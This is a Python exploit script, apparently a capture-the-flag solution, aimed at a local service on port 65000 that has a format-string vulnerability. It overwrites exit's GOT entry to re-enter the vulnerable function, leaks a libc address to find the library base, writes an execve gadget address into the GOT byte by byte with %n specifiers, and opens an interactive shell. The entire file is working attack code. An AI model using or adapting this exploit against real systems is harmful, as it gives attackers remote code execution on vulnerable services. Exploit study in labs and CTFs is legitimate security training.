import socket
import struct

from telnetlib import Telnet

def interact(skt):

    telnet = Telnet()
    telnet.sock = skt
    interact_handle_errors(telnet)

def interact_handle_errors(telnet):
    try:
        telnet.interact()

    except UnicodeDecodeError:
        interact_handle_errors(telnet)

def read_until(skt, _bytes, step=1):
    recv = b''
    while _bytes not in recv:
        recv += skt.recv(step)
    return recv

pack = lambda x: struct.pack("Q", x)

def get_socket():
    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    skt.connect(('localhost', 65000))
    return skt

def get_ret2vuln_payload():

    exit_got = pack(0x601040)

    ret2vuln_payload = b'%4195824c%9$n'
    ret2vuln_payload += b'A' * ( 24 - len(ret2vuln_payload) )
    ret2vuln_payload += exit_got

    return ret2vuln_payload

def get_leaker_payload():

    leaker_payload = b'%3$p'
    return leaker_payload

def get_bytes_final_values(address):

    first_byte_digits = [ [i] for i in hex(address)[2::2]]

    second_byte_digits = [ [i] for i in hex(address)[3::2]]

    _bytes  = [ int(''.join(first+second), 16) for first, second in zip(first_byte_digits, second_byte_digits)]

    # last two bytes will be joined to form a big number
    # Since the overflowing method to write it won't work
    _bytes[0] = _bytes[0] * 0x100 + _bytes[1]
    del _bytes[1]

    # reverse list, to put in the writing order of the bytes
    _bytes = _bytes[::-1]

    # reverse, because that is the order we will write
    for i in range(1, len(_bytes)-1):

        # check if we need to add
        if( _bytes[i-1] > _bytes[i]):

            _bytes[i] += 0x100 * ( (_bytes[i-1] // 0x100) + 1)

    bytes_written=_bytes[0]

    for i in range(1, len(_bytes)):

        _bytes[i] = _bytes[i] - bytes_written
        bytes_written += _bytes[i]

    return _bytes

def get_initial_offset(_bytes):

    offset=6 # first offset that point to the stack
    s=0
    for value in _bytes:

        # %<number>c
        s+=len(str(value)) + 2 # + 2 for '%' and 'c'

        # %<offset:len() = 2>$n
        s+=5

    # alignment
    s+= (8 - s % 8)
    return int(offset + s/8)

def get_write_to_payload(address, value):

    _bytes = get_bytes_final_values(value)

    payload = b''

    offset = get_initial_offset(_bytes)

    print("[!] initial offset in payload: ", offset)

    # add writing units
    for value in _bytes:

        payload += b'%' + str(value).encode('utf-8') + b'c%' + str(offset).rjust(2, '0').encode('utf-8') + b'$n'
        offset += 1

    # align payload
    payload += ( 8 - len(payload) % 8 ) * b'.'

    # write addresses
    for i in range(len(_bytes)):

        payload += pack(address+i)

    return payload

def get_shell_payload(libc_base):

    exit_got = 0x601040

    execve = libc_base + 0xb8c0f

    print("[+] execve gadget found: ", hex(execve))

    print("[!] building shell payload...")

    payload = get_write_to_payload(exit_got, execve)
    
    print("[!] sending shell payload:")
    print(payload)
    return payload

if __name__ == "__main__":

    skt = get_socket()

    read_until(skt, b'?')

    skt.send(get_ret2vuln_payload())

    # wait for prompt again
    print("[!] wait for ret2vuln response...")
    read_until(skt, b'?', 1000000)
    print("[+] ret2vuln response received!")

    skt.send(get_leaker_payload())

    __write_nocancel_7 = int(str(read_until(skt, b'?')).split('\\x')[0].split('you:')[1], 16)

    libc_base = __write_nocancel_7 - 0x10 - 0xdb960

    print("[+] libc base address found: ", hex(libc_base))
    input()
    skt.send(get_shell_payload(libc_base))

    interact(skt)
